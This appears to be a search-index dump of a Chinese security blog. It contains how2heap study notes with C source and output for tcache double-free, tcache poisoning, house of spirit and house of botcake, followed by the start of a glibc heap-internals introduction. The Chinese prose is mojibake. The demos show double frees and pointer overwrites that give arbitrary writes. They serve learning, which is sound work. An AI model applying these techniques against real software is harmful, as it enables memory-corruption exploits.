fprintf(stderr,\"\\nTCache Idx: %llu\\n\", tidx); } return 0; } è¾“å‡ºï¼š This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size. The basic formula is as follows: (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT On a 64 bit system the current values are: MINSIZE: 0x20 MALLOC_ALIGNMENT: 0x10 So we get the following equation: (IDX = CHUNKSIZE - 0x11) / 0x10 BUT be AWARE that CHUNKSIZE is not the x in malloc(x) It is calculated as follows: IF x \u003cMINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20) ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK) =\u003e CHUNKSIZE = (x + 0x8 + 0xf) \u0026 ~0xf) [CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10 TCache Idx: 0 å…³äº tcache ä»‹ç»å¯ä»¥å‚è€ƒ è¿™é‡Œã€‚ è¿™ä¸ªä¾‹å­è¯´æ˜äº† tcache çš„ç´¢å¼•æ˜¯å¦‚ä½•åˆ†é…çš„ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ CHUNKSIZE æ˜¯ç»è¿‡ request2size è½¬åŒ–åçš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯ chunk çš„å®é™…å¤§å°ã€‚tcache ç´¢å¼• IDX å¯ä»¥ç”±ä¸Šé¢çš„å…¬å¼å¾—åˆ°ã€‚ ","date":"2019-12-09","objectID":"/how2heap/:17:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"tcache_dup æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file demonstrates a simple double-free attack with tcache.\\n\"); fprintf(stderr,\"Allocating buffer.\\n\"); int *a = malloc(8); fprintf(stderr,\"malloc(8): %p\\n\", a); fprintf(stderr,\"Freeing twice...\\n\"); free(a); free(a); fprintf(stderr,\"Now the free list has [%p, %p].\\n\", a, a); fprintf(stderr,\"Next allocated buffers will be same: [%p, %p].\\n\", malloc(8), malloc(8)); return 0; } è¾“å‡ºï¼š This file demonstrates a simple double-free attack with tcache. Allocating buffer. malloc(8): 0x1a90260 Freeing twice... Now the free list has [0x1a90260, 0x1a90260]. Next allocated buffers will be same: [0x1a90260, 0x1a90260]. å’Œ fastbin ç±»ä¼¼ï¼Œtcache ä¹Ÿå­˜åœ¨ double freeï¼Œè€Œä¸”è¿˜æ²¡æœ‰é“¾è¡¨å¤´æ£€æŸ¥ï¼Œå› æ­¤åªéœ€è¦è¿ç»­ä¸¤æ¬¡ free å°±å¥½äº†ï¼Œæ›´åŠ ç®€å•ã€‚ ","date":"2019-12-09","objectID":"/how2heap/:18:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"tcache_poisoning æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstdint.h\u003e int main() { fprintf(stderr,\"This file demonstrates a simple tcache poisoning attack by tricking malloc into\\n\" \"returning a pointer to an arbitrary location (in this case, the stack).\\n\" \"The attack is very similar to fastbin corruption attack.\\n\\n\"); size_t stack_var; fprintf(stderr,\"The address we want malloc() to return is %p.\\n\", (char *)\u0026stack_var); fprintf(stderr,\"Allocating 1 buffer.\\n\"); intptr_t *a = malloc(128); fprintf(stderr,\"malloc(128): %p\\n\", a); fprintf(stderr,\"Freeing the buffer...\\n\"); free(a); fprintf(stderr,\"Now the tcache list has [%p].\\n\", a); fprintf(stderr,\"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n\" \"to point to the location to control (%p).\\n\", sizeof(intptr_t), a, \u0026stack_var); a[0] = (intptr_t)\u0026stack_var; fprintf(stderr,\"1st malloc(128): %p\\n\", malloc(128)); fprintf(stderr,\"Now the tcache list has [%p].\\n\", \u0026stack_var); intptr_t *b = malloc(128); fprintf(stderr,\"2nd malloc(128): %p\\n\", b); fprintf(stderr,\"We got the control\\n\"); return 0; } è¾“å‡ºï¼š This file demonstrates a simple tcache poisoning attack by tricking malloc into returning a pointer to an arbitrary location (in this case, the stack). The attack is very similar to fastbin corruption attack. The address we want malloc() to return is 0x7ffd4941b420. Allocating 1 buffer. malloc(128): 0x1601260 Freeing the buffer... Now the tcache list has [0x1601260]. We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260 to point to the location to control (0x7ffd4941b420). 1st malloc(128): 0x1601260 Now the tcache list has [0x7ffd4941b420]. 2nd malloc(128): 0x7ffd4941b420 We got the control å’Œ fastbin_dup_into_stack ç±»ä¼¼ï¼Œæ”¹å†™å·²ç» free æ‰çš„ chunk çš„ fd æŒ‡å‘æ ˆä¸Šåœ°å€ï¼Œç„¶å malloc ä¸¤æ¬¡å³å¯åˆ†é…åˆ°æ ˆä¸Šã€‚ ","date":"2019-12-09","objectID":"/how2heap/:19:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"tcache_house_of_spirit æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file demonstrates the house of spirit attack on tcache.\\n\"); fprintf(stderr,\"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\\n\"); fprintf(stderr,\"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\\n\"); fprintf(stderr,\"(Search for strings \\\"invalid next size\\\"and \\\"double free or corruption\\\")\\n\\n\"); fprintf(stderr,\"Ok. Let's start with the example!.\\n\\n\"); fprintf(stderr,\"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr,\"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\\n\"); unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region fprintf(stderr,\"This region contains one fake chunk. It's size field is placed at %p\\n\", \u0026fake_chunks[1]); fprintf(stderr,\"This chunk size has to be falling into the tcache category (chunk.size \u003c= 0x410; malloc arg \u003c= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr,\"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr,\"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", \u0026fake_chunks[1]); fprintf(stderr,\"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = \u0026fake_chunks[2]; fprintf(stderr,\"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr,\"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", \u0026fake_chunks[1], \u0026fake_chunks[2]); fprintf(stderr,\"malloc(0x30): %p\\n\", malloc(0x30)); } è¾“å‡ºï¼š This file demonstrates the house of spirit attack on tcache. It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed. You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane. (Search for strings\"invalid next size\"and\"double free or corruption\") Ok. Let's start with the example!. Calling malloc() once so that it sets up its memory. Let's imagine we will overwrite 1 pointer to point to a fake chunk region. This region contains one fake chunk. It's size field is placed at 0x7ffe46748fb8 This chunk size has to be falling into the tcache category (chunk.size \u003c= 0x410; malloc arg \u003c= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0! malloc(0x30): 0x7ffe46748fc0 ä¾ç„¶éå¸¸ç®€å•ã€‚ç›¸æ¯”ä¼ ç»Ÿ house of spiritï¼Œtcache ä¸­ä¸ä¼šæ£€æŸ¥è¢«é‡Šæ”¾çš„ chunk çš„ä¸‹ä¸€ä¸ª chunk çš„ chunk_size å­—æ®µã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦ä¿è¯ fake chunk æœ¬èº«çš„å¤§å°åˆæ³•ï¼ˆå®é™…ä¸Šå°±æ˜¯ä½äº small bin èŒƒå›´å†…ï¼‰å°±å¯ä»¥äº†ã€‚éšåå°† fake chunk çš„ mem æŒ‡é’ˆèµ‹å€¼ç»™ aï¼Œfree(a) å°±å°† fake chunk æ”¾è¿›äº† tcacheï¼Œå†æ¬¡ malloc å³å¯æ‹¿åˆ° fake chunkã€‚ ","date":"2019-12-09","objectID":"/how2heap/:20:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_botcake æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstdint.h\u003e#include \u003cassert.h\u003e int main() { /* * This attack should bypass the restriction introduced in * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d * If the libc does not include the restriction, you can simply double free the victim and do a * simple tcache poisoning */ // disable buffering and make _FILE_IO does not interfere with our heap setbuf(stdin, NULL); setbuf(stdout, NULL); // introduction puts(\"This file demonstrates a powerful tcache poisoning attack by tricking malloc into\"); puts(\"returning a pointer to an arbitrary location (in this demo, the stack).\"); puts(\"This attack only relies on double free.\\n\"); // prepare the target intptr_t stack_var[4]; puts(\"The address we want malloc() to return, namely,\"); printf(\"the target address is %p.\\n\\n\", stack_var); // prepare heap layout puts(\"Preparing heap layout\"); puts(\"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.\"); intptr_t *x[7]; for(int i=0; i\u003csizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\"Allocating a chunk for later consolidation\"); intptr_t *prev = malloc(0x100); puts(\"Allocating the victim chunk.\"); intptr_t *a = malloc(0x100); printf(\"malloc(0x100): a=%p.\\n\", a); puts(\"Allocating a padding to prevent consolidation.\\n\"); malloc(0x10); // cause chunk overlapping puts(\"Now we are able to cause chunk overlapping\"); puts(\"Step 1: fill up tcache list\"); for(int i=0; i\u003c7; i++){ free(x[i]); } puts(\"Step 2: free the victim chunk so it will be added to unsorted bin\"); free(a); puts(\"Step 3: free the previous chunk and make it consolidate with the victim chunk.\"); free(prev); puts(\"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\"); malloc(0x100); /*VULNERABILITY*/ free(a);// a is already freed /*VULNERABILITY*/ // simple tcache poisoning puts(\"Launch tcache poisoning\"); puts(\"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk\"); intptr_t *b = malloc(0x120); puts(\"We simply overwrite victim's fwd pointer\"); b[0x120/8-2] = (long)stack_var; // take target out puts(\"Now we can cash out the target chunk.\"); malloc(0x100); intptr_t *c = malloc(0x100); printf(\"The new chunk is at %p\\n\", c); // sanity check assert(c==stack_var); printf(\"Got control on target/stack!\\n\\n\"); // note puts(\"Note:\"); puts(\"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim\"); puts(\"In that case, once you have done this exploitation, you can have many arbitary writes very easily.\"); return 0; } è¾“å‡ºï¼š This file demonstrates a powerful tcache poisoning attack by tricking malloc into returning a pointer to an arbitrary location (in this demo, the stack). This attack only relies on double free. The address we want malloc() to return, namely, the target address is 0x7ffd2845e850. Preparing heap layout Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later. Allocating a chunk for later consolidation Allocating the victim chunk. malloc(0x100): a=0xcffae0. Allocating a padding to prevent consolidation. Now we are able to cause chunk overlapping Step 1: fill up tcache list Step 2: free the victim chunk so it will be added to unsorted bin Step 3: free the previous chunk and make it consolidate with the victim chunk. Step 4: add the victim chunk to tcache list by taking one out from it and free victim again Launch tcache poisoning Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk We simply overwrite victim's fwd pointer Now we can cash out the target chunk. The new chunk is at 0x7ffd2845e850 Got control on target/stack! Note: And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim In that case, once you have done this exploitation, ","date":"2019-12-09","objectID":"/how2heap/:21:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"The heap is a beautiful mess. æœ¬æ–‡å°†å¯¹ Glibc å †ä¸Šçš„å†…å­˜ç®¡ç†ä½œç®€è¦ä»‹ç»ï¼Œéƒ¨åˆ†å†…å®¹ç¿»è¯‘è‡ªå‚è€ƒèµ„æ–™ä¸­çš„æ–‡ç« ã€‚ç•¥è¿‡äº†è®¸å¤šç»†èŠ‚ï¼Œä¸»è¦æ˜¯ä¸ºäº†å¯¹æ–°æ‰‹å‹å¥½ã€‚ é»˜è®¤è¯»è€…ç†Ÿæ‚‰æ“ä½œç³»ç»Ÿã€C è¯­è¨€åŠå…¶è¿è¡Œæœºåˆ¶ï¼Œå¹¶ä¸”å¯¹äº C ä¸­çš„å‡½æ•°è°ƒç”¨æ ˆæœ‰æ‰€äº†è§£ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:0:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä»€ä¹ˆæ˜¯å †ï¼Ÿ å †æ˜¯æ¯ä¸ªç¨‹åºè¢«åˆ†é…åˆ°çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œå’Œæ ˆçš„åŒºåˆ«ä¸»è¦åœ¨äºå †å†…å­˜æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºå¯ä»¥ä» heap æ®µè¯·æ±‚ä¸€å—å†…å­˜ï¼Œæˆ–è€…é‡Šæ”¾ä¸€å—å†…å­˜ã€‚ å¦å¤–ï¼Œå †å†…å­˜æ˜¯å…¨å±€çš„ï¼Œå³åœ¨ç¨‹åºçš„ä»»æ„ä½ç½®éƒ½å¯ä»¥è®¿é—®åˆ°å †ï¼Œå¹¶ä¸ä¸€å®šè¦åœ¨è°ƒç”¨ malloc çš„é‚£ä¸ªå‡½æ•°é‡Œè®¿é—®ã€‚è¿™æ˜¯å› ä¸º C è¯­è¨€ä½¿ç”¨æŒ‡é’ˆæŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜ã€‚ä½†ç›¸æ¯”è®¿é—®æ ˆä¸Šçš„é™æ€å±€éƒ¨å˜é‡ï¼Œä½¿ç”¨æŒ‡é’ˆä¹Ÿå¸¦æ¥äº†ä¸€å®šçš„å¼€é”€ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:1:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä½¿ç”¨åŠ¨æ€åˆ†é…çš„å†…å­˜ GLibc é‡‡ç”¨ ptmalloc2 å†…å­˜åˆ†é…å™¨ç®¡ç†å †å†…å­˜ï¼Œç›¸æ¯”å‰èº« dlmallocï¼Œå®ƒå¢åŠ äº†å¯¹å¤šçº¿ç¨‹çš„æ”¯æŒã€‚å¤šçº¿ç¨‹çš„å¥½å¤„å°±ä¸å¤šèµ˜è¿°äº†ã€‚ å€ŸåŠ© stdlib.h æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ malloc å’Œ free å‡½æ•°æ¥æ“ä½œå †å†…å­˜ï¼š char *buffer = (char *)malloc(10); strcpy(buffer,\"hello\"); printf(\"%s\\n\", buffer); free(buffer); ç¬¬ä¸€è¡Œåˆ†é…äº† 10 å­—èŠ‚ç»™ bufferï¼Œæ³¨æ„è¿™é‡Œçš„å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯å¿…é¡»çš„ï¼›ç¬¬ 2-3 è¡Œä½¿ç”¨äº† buffer è¿™å—å†…å­˜ï¼Œå¹¶åœ¨æœ€åä¸€è¡Œé‡Šæ”¾ã€‚ ä¸‹é¢æ˜¯ malloc å’Œ free å‡½æ•°çš„æ³¨é‡Šï¼š /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ æ³¨æ„ï¼Œå³ä½¿ç”³è¯· 0 å­—èŠ‚å†…å­˜ï¼Œmalloc ä¾ç„¶ä¼šåˆ†é…ä¸€ä¸ªæœ€å°çš„ chunkï¼›å¦‚æœä¼ ç»™ free çš„å‚æ•°æ˜¯ç©ºæŒ‡é’ˆï¼Œfree ä¸ä¼šåšä»»ä½•äº‹ï¼Œè€Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸€ä¸ªå·²ç» free è¿‡çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆåæœæ˜¯ä¸å¯é¢„æœŸçš„ã€‚è¿™é‡Œå°¤å…¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ Java ç­‰è¯­è¨€ä¸åŒï¼ŒC è¯­è¨€ä¸­é‡Šæ”¾æ‰åˆ†é…åˆ°çš„å†…å­˜çš„è´£ä»»åœ¨äºç¨‹åºå‘˜ï¼Œå¹¶ä¸”åˆ†é…åˆ°çš„å†…å­˜åªåº”ä½¿ç”¨ä¸€æ¬¡ã€‚ è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æ›´åº•å±‚ä¸Šæ˜¯ä½¿ç”¨ brk() å’Œ mmap() è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æ¥ç®¡ç†å†…å­˜çš„ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:2:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ æ³¨æ„ç”³è¯·å†…å­˜æ—¶ï¼ŒLinux å†…æ ¸åªä¼šå…ˆåˆ†é…ä¸€æ®µè™šæ‹Ÿå†…å­˜ï¼ŒçœŸæ­£ä½¿ç”¨æ—¶æ‰ä¼šæ˜ å°„åˆ°ç‰©ç†å†…å­˜ä¸Šå»ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:3:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"brk() brk() é€šè¿‡å¢åŠ  break location æ¥è·å–å†…å­˜ï¼Œä¸€å¼€å§‹ heap æ®µçš„èµ·ç‚¹ start_brk å’Œ heap æ®µçš„ç»ˆç‚¹ brk æŒ‡å‘åŒä¸€ä¸ªä½ç½®ã€‚ ASLR å…³é—­æ—¶ï¼Œä¸¤è€…æŒ‡å‘ data/bss æ®µçš„æœ«å°¾ï¼Œä¹Ÿå°±æ˜¯ end_data ASLR å¼€å¯æ—¶ï¼Œä¸¤è€…æŒ‡å‘ data/bss æ®µçš„æœ«å°¾åŠ ä¸Šä¸€æ®µéšæœº brk åç§» å›¾ 1ï½œProcess Virtual Memory Layout \" å›¾ 1ï½œProcess Virtual Memory Layout æ³¨ï¼šæ³¨æ„ä¸ sbrk() çš„åŒºåˆ«ï¼Œåè€…æ˜¯ C è¯­è¨€åº“å‡½æ•°ï¼Œmalloc æºç ä¸­çš„ MORECORE å°±æ˜¯è°ƒç”¨çš„ sbrk()ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:3:1","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"mmap() ç”¨äºåˆ›å»ºç§æœ‰çš„åŒ¿åæ˜ å°„æ®µï¼Œä¸»è¦æ˜¯ä¸ºäº†åˆ†é…ä¸€å—æ–°çš„å†…å­˜ï¼Œä¸”è¿™å—å†…å­˜åªæœ‰è°ƒç”¨ mmap() çš„è¿›ç¨‹å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºç§æœ‰çš„ã€‚ä¸ä¹‹è¿›è¡Œç›¸åæ“ä½œçš„æ˜¯ munmap()ï¼Œåˆ é™¤ä¸€å—å†…å­˜åŒºåŸŸä¸Šçš„æ˜ å°„ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:3:2","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å¤šçº¿ç¨‹ä¸ Arena å‰é¢æåˆ°ï¼Œptmalloc2 çš„ä¸€å¤§æ”¹è¿›å°±åœ¨äºå¤šçº¿ç¨‹ï¼Œé‚£ä¹ˆä»–æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿä¸éš¾çŒœåˆ°ï¼Œæ¯ä¸ªçº¿ç¨‹å¿…å®šè¦ç»´æŠ¤ä¸€äº›ç‹¬ç«‹çš„æ•°æ®ç»“æ„ï¼Œå¹¶ä¸”å¯¹è¿™äº›æ•°æ®ç»“æ„çš„è®¿é—®æ˜¯éœ€è¦åŠ é”çš„ã€‚çš„ç¡®ï¼Œåœ¨ ptmalloc2 ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰è‡ªå·±çš„ freelistï¼Œä¹Ÿå°±æ˜¯ç»´æŠ¤ç©ºé—²å†…å­˜çš„ä¸€ä¸ªé“¾è¡¨ï¼›ä»¥åŠè‡ªå·±çš„ arenaï¼Œä¸€æ®µè¿ç»­çš„å †å†…å­˜åŒºåŸŸã€‚ç‰¹åˆ«åœ°ï¼Œä¸»çº¿ç¨‹çš„ arena å«åš main_arenaã€‚æ³¨æ„åªæœ‰ main_arena å¯ä»¥è®¿é—® heap æ®µå’Œ mmap æ˜ å°„åŒºåŸŸï¼Œnon_main_arena åªèƒ½è®¿é—® mmap æ˜ å°„åŒºåŸŸã€‚ æ³¨ï¼šçº¿ç¨‹è¾ƒå¤šæ—¶ï¼Œäº’æ–¥é”æœºåˆ¶ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚ å½“æˆ‘ä»¬åœ¨ç¨‹åºä¸­ç¬¬ä¸€æ¬¡ç”³è¯·å†…å­˜æ—¶è¿˜æ²¡æœ‰ heap æ®µï¼Œå› æ­¤ 132KB çš„ heap æ®µï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ main_arenaï¼Œä¼šè¢«åˆ›å»ºï¼ˆé€šè¿‡ brk()è°ƒç”¨ï¼‰ï¼Œæ— è®ºæˆ‘ä»¬ç”³è¯·çš„å†…å­˜æ˜¯å¤šå¤§ã€‚å¯¹äºæ¥ä¸‹æ¥çš„å†…å­˜ç”³è¯·ï¼Œmalloc éƒ½ä¼šä» main_arena ä¸­å°è¯•å–å‡ºä¸€å—å†…å­˜è¿›è¡Œåˆ†é…ã€‚å¦‚æœç©ºé—´ä¸å¤Ÿï¼Œmain_arena å¯ä»¥é€šè¿‡ brk() æ‰©å¼ ï¼›å¦‚æœç©ºé—²ç©ºé—´å¤ªå¤šï¼Œä¹Ÿå¯ä»¥ç¼©å°ã€‚ é‚£ä¹ˆå¯¹äº non_main_arena å‘¢ï¼Ÿå‰é¢æåˆ°å®ƒåªèƒ½è®¿é—® mmap æ˜ å°„åŒºåŸŸï¼Œå› ä¸ºåœ¨åˆ›å»ºæ—¶å®ƒå°±æ˜¯ç”± mmap() åˆ›å»ºçš„â€”â€”1MB çš„å†…å­˜ç©ºé—´ä¼šè¢«æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œä¸è¿‡å®é™…ä¸Šåªæœ‰ 132KB æ˜¯å¯è¯»å†™çš„ï¼Œè¿™ 132KB å°±æ˜¯è¯¥çº¿ç¨‹çš„ heap ç»“æ„ï¼Œæˆ–è€…å« non_main_arenaã€‚ æ³¨ï¼šå½“ç„¶äº†ï¼Œå½“ç”³è¯·çš„ç©ºé—´å¤§äº 128KB ä¸” arena ä¸­æ²¡æœ‰è¶³å¤Ÿç©ºé—´æ—¶ï¼Œæ— è®ºåœ¨å“ªä¸ª arena é‡Œéƒ½åªèƒ½é€šè¿‡ mmap() åˆ†é…å†…å­˜ã€‚ arena ä¹Ÿä¸æ˜¯å’Œçº¿ç¨‹ä¸€å¯¹ä¸€çš„ï¼Œå®é™…ä¸Šæœ‰æ•°é‡é™åˆ¶ï¼š For 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. è€Œå½“æˆ‘ä»¬ free ä¸€å°å—å†…å­˜æ—¶ï¼Œå†…å­˜ä¹Ÿä¸ä¼šç›´æ¥å½’è¿˜ç»™å†…æ ¸ï¼Œè€Œæ˜¯ç»™ ptmalloc2 è®©ä»–å»ç»´æŠ¤ï¼Œåè€…ä¼šå°†ç©ºé—²å†…å­˜ä¸¢å…¥ bin ä¸­ï¼Œæˆ–è€…è¯´ freelist ä¸­ä¹Ÿå¯ä»¥ã€‚å¦‚æœè¿‡äº†ä¸€ä¼šæˆ‘ä»¬çš„ç¨‹åºåˆè¦ç”³è¯·å†…å­˜ï¼Œé‚£ä¹ˆ ptmalloc2 å°±ä¼šä» bin ä¸­æ‰¾ä¸€å—ç©ºé—²çš„å†…å­˜è¿›è¡Œåˆ†é…ï¼Œæ‰¾ä¸åˆ°çš„è¯æ‰ä¼šå»é—®å†…æ ¸è¦å†…å­˜ã€‚ ","date":"2019-12-08","objectID":"/glibc-heap/:4:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç»´æŠ¤å¤šä¸ªå † å‰é¢æåˆ°ï¼Œmain_arena åªæœ‰ä¸€ä¸ªå †ï¼Œå¹¶ä¸”å¯ä»¥çµæ´»åœ°æ”¾ç¼©ï¼›non_main_arena åˆ™åªèƒ½é€šè¿‡ mmap() è·å¾—ä¸€ä¸ªå †ã€‚é‚£ä¹ˆå¦‚æœ non_main_arena é‡Œåˆ†é…çš„å †å†…å­˜ä¸å¤Ÿäº†æ€ä¹ˆåŠï¼Ÿå¾ˆç®€å•ï¼Œå† mmap() ä¸€æ¬¡ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å †ã€‚ æ‰€ä»¥ï¼Œåœ¨ non_main_arena é‡Œï¼Œæˆ‘ä»¬å¿…é¡»è€ƒè™‘å¦‚ä½•ç»´æŠ¤å¤šä¸ªå †çš„é—®é¢˜ã€‚è¿™é‡Œæˆ‘ä»¬ä¼šæ¶‰åŠä¸‰ä¸ªå¤´éƒ¨ï¼š heap_infoï¼šæ¯ä¸ªå †çš„å¤´éƒ¨ï¼Œmain_arena æ˜¯æ²¡æœ‰çš„ malloc_stateï¼šarena çš„å¤´éƒ¨ï¼Œmain_arena çš„è¿™ä¸ªéƒ¨åˆ†æ˜¯å…¨å±€å˜é‡è€Œä¸å±äºå †æ®µ malloc_chunkï¼šæ¯ä¸ª chunk çš„å¤´éƒ¨ å…·ä½“ä¸€ç‚¹ï¼Œheap_info å®Œæ•´å®šä¹‰å¦‚ä¸‹ï¼š typedef struct _heap_info { mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ \u0026 